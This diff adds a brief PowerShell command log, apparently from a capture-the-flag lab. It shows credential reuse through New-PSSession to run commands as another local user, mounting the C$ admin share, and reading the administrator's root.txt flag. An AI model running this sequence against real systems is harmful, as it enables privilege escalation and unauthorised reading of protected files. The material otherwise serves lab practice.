@@ -1,0 +1,25 @@
+PS C:\windows\temp> $user = 'HOSTNAME\user'
+
+$user = 'HOSTNAME\user'
+
+PS C:\windows\temp> $pass = ConvertTo-SecureString -String "YOU_PASSWORD" -AsPlainText -Force
+
+$pass = ConvertTo-SecureString -String "YOU_PASSWORD" -AsPlainText -Force
+
+PS C:\windows\temp> $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ($user,$pass) 
+
+$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ($user,$pass) 
+
+PS C:\windows\temp> $s = New-PSSession -ComputerName LOCALHOST -Credential $cred         
+
+$s = New-PSSession -ComputerName LOCALHOST -Credential $cred
+
+PS C:\windows\temp> Invoke-Command -Session $s -ScriptBlock {net use G: \\localhost\c$}
+
+Invoke-Command -Session $s -ScriptBlock {net use G: \\localhost\c$}
+
+The command completed successfully.
+
+PS C:\windows\temp> Invoke-Command -Session $s -ScriptBlock {type G:\users\administrator\desktop\root.txt}
+
+Invoke-Command -Session $s -ScriptBlock {type G:\users\administrator\desktop\root.txt}
